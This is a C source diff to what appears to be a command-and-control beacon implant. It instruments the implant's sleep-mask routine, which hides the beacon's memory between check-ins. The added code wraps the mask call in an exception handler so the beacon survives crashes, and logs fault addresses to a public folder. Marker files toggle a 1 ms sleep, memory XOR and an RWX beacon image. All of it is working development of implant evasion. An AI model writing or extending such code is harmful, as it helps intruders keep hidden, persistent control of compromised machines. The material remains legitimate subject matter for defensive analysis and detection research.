@@ -259,6 +259,34 @@ void setup_functions(BOFF_FUNCTIONS * f) {
 }
 
 #if defined(_M_X64)
+/* Log an exception raised inside the sleep-mask BOF and swallow it, so the
+ * beacon survives to sleep again and the fault address lands in the file. */
+static int sm_invoke_filter(EXCEPTION_POINTERS * ep) {
+	HANDLE h;
+	char lb[128];
+	DWORD wr;
+	int n;
+	h = CreateFileA("C:\\Users\\Public\\sm_exc.txt", FILE_APPEND_DATA,
+		FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (h == INVALID_HANDLE_VALUE)
+		return EXCEPTION_EXECUTE_HANDLER;
+	n = wsprintfA(lb, "code=%08X addr=%p\r\n",
+		ep->ExceptionRecord->ExceptionCode, ep->ExceptionRecord->ExceptionAddress);
+	WriteFile(h, lb, (DWORD)n, &wr, NULL);
+	CloseHandle(h);
+	return EXCEPTION_EXECUTE_HANDLER;
+}
+
+static DWORD sm_invoke_seh(void * fn, GARGLEP * gp, DWORD t) {
+	__try {
+		((void (*)(GARGLEP *, void *, DWORD))fn)(gp, (void *)Sleep, t);
+		return 0;
+	}
+	__except (sm_invoke_filter(GetExceptionInformation())) {
+		return 1;
+	}
+}
+
 static void sm_dump_prots(char * buf, int * np, void * p, char * tag) {
 	MEMORY_BASIC_INFORMATION m;
 	if (p == NULL || VirtualQuery(p, &m, sizeof(m)) == 0) {
@@ -716,6 +744,7 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 				   and a terminator-only heap table.
 				   C:\Users\Public\sm_sect  -> real sections, empty heap (XOR image only).
 				   C:\Users\Public\sm_heap  -> empty sections, real heap (XOR heap only).
+				   C:\Users\Public\sm_t1    -> invoke with time=1ms (window discriminator).
 				   C:\Users\Public\sm_wrwx  -> VirtualProtect the beacon image to RWX
 				   before invoke (left RWX; tests the RX-write hypothesis). */
 				{
@@ -730,6 +759,8 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 						sm_mode |= 8;
 					if (GetFileAttributesA("C:\\Users\\Public\\sm_heap") != INVALID_FILE_ATTRIBUTES)
 						sm_mode |= 16;
+					if (GetFileAttributesA("C:\\Users\\Public\\sm_t1") != INVALID_FILE_ATTRIBUTES)
+						sm_mode |= 32;
 					sm_span = sm_max_end(gparms);
 					sm_dump_gparms(gparms, code_dst, total, t, sm_mode, sm_span,
 						(void *)inlinefunc);
@@ -749,12 +780,19 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 								PAGE_EXECUTE_READWRITE, &sm_old))
 							sm_mode |= 4;
 					}
+					if ((sm_mode & 32) != 0)
+						t = 1;
 				}
 #endif
 				if (gparms == NULL)
 					Sleep(t);
+#if defined(_M_X64)
+				else
+					sm_invoke_seh((void *)inlinefunc, gparms, t);
+#else
 				else
 					((void (*)(GARGLEP *, void *, DWORD))inlinefunc)(gparms, (void *)Sleep, t);
+#endif
 #if defined(_M_X64)
 				/* breadcrumb: proves the BOF returned (crash inside invoke
 				 * never reaches this write) */
